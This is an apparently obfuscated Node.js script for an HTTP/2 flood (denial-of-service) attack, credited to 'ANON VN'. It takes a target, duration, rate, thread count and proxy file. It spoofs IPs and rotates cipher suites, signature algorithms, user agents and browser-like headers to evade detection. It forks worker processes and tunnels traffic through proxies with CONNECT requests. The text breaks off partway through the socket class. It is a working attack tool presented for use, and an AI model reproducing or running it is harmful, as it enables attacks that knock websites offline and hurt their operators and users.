const net=require('net');
const http2=require('http2');
const tls=require('tls');
const cluster=require('cluster');
const url=require('url');
const crypto=require('crypto');
const fs=require('fs');
const cheerio=require('cheerio');
const colors=require('colors');
const randomUserAgent=require('random-useragent');
const userAgent=randomUserAgent.getRandom();
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners=0;
process.on('uncaughtException',function(_0x3a4c4c){});
process.on('uncaughtException',function(_0x315836){});
if(process.argv.length<7){
	console.log('Usage: target time rate thread proxyfile');
	process.exit();
}
const headers={};
function readLines(_0x335c9d){
	return fs.readFileSync(_0x335c9d,'utf-8').toString().split(/\r?\n/);
}
function randomIntn(_0x16fa33,_0x1ccd47){
	return Math.floor(Math.random()*(_0x1ccd47-_0x16fa33)+_0x16fa33);
}
function randomElement(_0x4cda45){
	return _0x4cda45[randomIntn(0,_0x4cda45.length)];
}
function randstr(_0x58fe40){
	const _0x46b442='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
	let _0x2c2349='';
	const _0x2559ff=_0x46b442.length;
	for(let _0x2def77=0;_0x2def77<_0x58fe40;_0x2def77++){
		_0x2c2349+=_0x46b442.charAt(Math.floor(Math.random()*_0x2559ff));
	}
	return _0x2c2349;
}
const ip_spoof=()=>{
	const _0xfcc768=()=>{
		return Math.floor(Math.random()*255);
	};
	return _0xfcc768()+'.'+_0xfcc768()+'.'+_0xfcc768()+'.'+_0xfcc768();
};
const spoofed=ip_spoof();
const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 };
const sig=['ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512','ecdsa_secp256r1_sha256','ecdsa_secp384r1_sha384','ecdsa_secp521r1_sha512','ecdsa_brainpoolP256r1tls13_sha256','ecdsa_brainpoolP384r1tls13_sha384','ecdsa_brainpoolP512r1tls13_sha512','dsa_sha256','dsa_sha384','dsa_sha512','dsa_sha224','dsa_sha1','rsa_pss_rsae_sha256','rsa_pss_rsae_sha384','rsa_pss_rsae_sha512','rsa_pkcs1_sha256','rsa_pkcs1_sha384','rsa_pkcs1_sha512','sm2sig_sm3'];
const sigalgs1=sig.join(':');
const cplist=['ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES','ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES','ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES','ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES','ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES','ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES','RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM','ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM','ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA','TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA','ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM','ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH','AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL','EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5','HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS','ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK','ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK','ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH','ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM','EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5','HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS','ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK','RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM','ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM','ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA','TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA','ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM','ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH','AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL','EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5','HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS','ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK','ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK','ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH','ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM','ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH','EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5','HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS','ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK','TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK','RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM','ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM','ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH'];
const accept_header=['application/json','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9','text/html; charset=utf-8','application/json, text/plain, */*','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'];
const lang_header=['en-US,en;q=0.9','en-US,en;q=0.8','en-US,en;q=0.7','en-US,en;q=0.6','en-US,en;q=0.5','ko-KR','en-US','zh-CN','zh-TW','ja-JP','en-GB','en-AU','en-GB,en-US;q=0.9,en;q=0.8','en-GB,en;q=0.5','en-CA','en-UK, en, de;q=0.5','en-NZ','en-GB,en;q=0.6','en-ZA','en-IN','en-PH','en-SG','en-HK','en-GB,en;q=0.8','en-GB,en;q=0.9',' en-GB,en;q=0.7','*','en-US,en;q=0.5','vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','utf-8, iso-8859-1;q=0.5, *;q=0.1','fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5','en-GB, en-US, en;q=0.9','de-AT, de-DE;q=0.9, en;q=0.5','cs;q=0.5','da, en-gb;q=0.8, en;q=0.7','he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7','en-US,en;q=0.9','de-CH;q=0.7','tr','zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'];
const encoding_header=['*','*/*','gzip','gzip, deflate, br','compress, gzip','deflate, gzip','gzip, identity','gzip, deflate','br','br;q=1.0, gzip;q=0.8, *;q=0.1','gzip;q=1.0, identity; q=0.5, *;q=0','gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25','compress;q=0.5, gzip;q=1.0','identity','gzip, compress','compress, deflate','compress','gzip, deflate, br','deflate','gzip, deflate, lzma, sdch','deflate'];
const control_header=['max-age=604800','proxy-revalidate','public, max-age=0','max-age=315360000','public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800','s-maxage=604800','max-stale','public, immutable, max-age=31536000','must-revalidate','private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0','max-age=31536000,public,immutable','max-age=31536000,public','min-fresh','private','public','s-maxage','no-cache','no-cache, no-transform','max-age=2592000','no-store','no-transform','max-age=31557600','stale-if-error','only-if-cached','max-age=0','must-understand, no-store','max-age=31536000; includeSubDomains','max-age=31536000; includeSubDomains; preload','max-age=120','max-age=0,no-cache,no-store,must-revalidate','public, max-age=604800, immutable','max-age=0, must-revalidate, private','max-age=0, private, must-revalidate','max-age=604800, stale-while-revalidate=86400','max-stale=3600','public, max-age=2678400','min-fresh=600','public, max-age=30672000','max-age=31536000, immutable','max-age=604800, stale-if-error=86400','public, max-age=604800','no-cache, no-store,private, max-age=0, must-revalidate','no-cache, no-store, must-revalidate, pre-check=0, post-check=0','public, s-maxage=600, max-age=60','public, max-age=31536000','max-age=14400, public','max-age=14400','max-age=600, private','public, s-maxage=600, max-age=60','no-store, no-cache, must-revalidate','no-cache, no-store,private, s-maxage=604800, must-revalidate'];
const defaultCiphers=crypto.constants.defaultCoreCipherList.split(':');
const ciphers1='GREASE:'+[defaultCiphers[2],defaultCiphers[1],defaultCiphers[0],...defaultCiphers.slice(3)].join(':');
const uap=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edge/12.0','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/12.0','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/12.0','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edge/12.0','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edge/12.0','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edge/12.0','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/12.0','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 Edge/12.0','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'];
const dest_header=['audio','audioworklet','document','embed','empty','font','frame','iframe','image','manifest','object','paintworklet','report','script','serviceworker','sharedworker','style','track','video','worker','xslt'];
const mode_header=['cors','navigate','no-cors','same-origin','websocket'];
const site_header=['cross-site','same-origin','same-site','none'];
const paths=['home','login','register','about','about-us','help','forum','pricing','support','bussiness','blog','explore','watch','contact','docs','status','privacy','terms','terms-of-use','legal','users'];
function generateRandomString(_0x186a1f,_0x9833cc){
	const _0x6d8f48='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
	const _0xcac6c9=Math.floor(Math.random()*(_0x9833cc-_0x186a1f+1))+_0x186a1f;
	let _0x458c36='';
	for(let _0x2ec383=0;_0x2ec383<_0xcac6c9;_0x2ec383++){
		const _0x4aa589=Math.floor(Math.random()*_0x6d8f48.length);
		_0x458c36+=_0x6d8f48.charAt(_0x4aa589);
	}
	return _0x458c36;
}
var randpath=paths[Math.floor(Math.floor(Math.random()*paths.length))];
var cipper=cplist[Math.floor(Math.floor(Math.random()*cplist.length))];
var siga=sig[Math.floor(Math.floor(Math.random()*sig.length))];
var uap1=uap[Math.floor(Math.floor(Math.random()*uap.length))];
var accept=accept_header[Math.floor(Math.floor(Math.random()*accept_header.length))];
var lang=lang_header[Math.floor(Math.floor(Math.random()*lang_header.length))];
var encoding=encoding_header[Math.floor(Math.floor(Math.random()*encoding_header.length))];
var proxies=readLines(args.proxyFile);
const parsedTarget=url.parse(args.target);
if(cluster.isMaster){
	for(let counter=1;counter<=args.threads;counter++){
		cluster.fork();
	}
	const proxyList=readLines(args.proxyFile);
	console.clear();
	console.log('Flood Recode By : ANON VN @Haidz2006'.rainbow);
    console.log('[33mTarget: [0m'+process.argv[2]);
	console.log('[33mTime: [0m'+process.argv[3]);
	console.log('[33mRate: [0m'+process.argv[4]);
	console.log('[33mThread(s): [0m'+process.argv[5]);
	console.log(`[33mProxyFile:[0m ${args.proxyFile} | [33mTotal:[0m ${proxies.length}`);
}else{
	setInterval(runFlooder);
}
class NetSocket{
	constructor(){}
	['HTTP'](_0x22472f,_0x5425aa){
		const _0x1a5d8c=_0x22472f.address.split(':');
		const _0x533b2e=_0x1a5d8c[0];
		const _0x4aad3f='CONNECT '+_0x22472f.address+':443 HTTP/1.1\r\nHost: '+_0x22472f.address+':443\r\nConnection: Keep-Alive\r\n\r\n';
		const _0x776691=new Buffer[('from')](_0x4aad3f);
		const _0x56d07f=net.connect({'host':_0x22472f.host,'port':_0x22472f.port});
		_0x56d07f.setTimeout(_0x22472f.timeout*100000);
		_0x56d07f.setKeepAlive(true,100000);
